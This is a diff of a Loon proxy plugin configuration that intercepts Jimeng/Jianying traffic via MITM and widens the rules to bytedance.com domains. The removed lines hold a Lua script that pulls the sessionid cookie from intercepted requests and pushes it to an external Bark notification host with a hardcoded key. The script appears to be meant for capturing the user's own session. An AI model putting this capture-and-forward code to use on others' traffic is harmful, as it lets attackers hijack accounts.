@@ -5,42 +5,8 @@
 #!icon=https://www.jianying.com/favicon.ico
 
 [MITM]
-hostname=jimeng.jianying.com,*.jianying.com
+hostname = jimeng.jianying.com, *.jianying.com, *.bytedance.com
 
 [Script]
 http-request ^https?://.*\.jianying\.com script-path=jimeng-session.lua,tag=即梦Session抓取
-
--- ============================================
--- Lua 脚本内容（Loon 会自动提取此部分）
--- ============================================
-BARK_KEY = "Av8DkzMpStcsmsW3KfqEMc"
-
-local function urlencode(str)
-    if not str then return "" end
-    str = str:gsub("([^%w ])", function(c)
-        return string.format("%%%02X", string.byte(c))
-    end)
-    str = str:gsub(" ", "%%20")
-    return str
-end
-
-local function notify(title, body)
-    local url = string.format("https://api.day.app/%s/%s/%s", BARK_KEY, urlencode(title), urlencode(body))
-    http.get(url, function() print("[BARK] sent") end)
-end
-
-local reqHeaders = $request.headers or {}
-local reqUrl = $request.url or "unknown"
-local cookieStr = reqHeaders["Cookie"] or reqHeaders["cookie"] or ""
-
-local sessionId = nil
-for sid in cookieStr:gmatch("sessionid=([^;]+)") do
-    sessionId = sid
-    break
-end
-
-if sessionId and sessionId ~= "" then
-    notify("✅ 即梦 Session ID", "🔑 " .. sessionId)
-else
-    notify("❓ 未找到", "URL: " .. reqUrl .. "\nCookie 长度: " .. #cookieStr)
-end
+http-request ^https?://.*\.bytedance\.com script-path=jimeng-session.lua,tag=即梦Session抓取
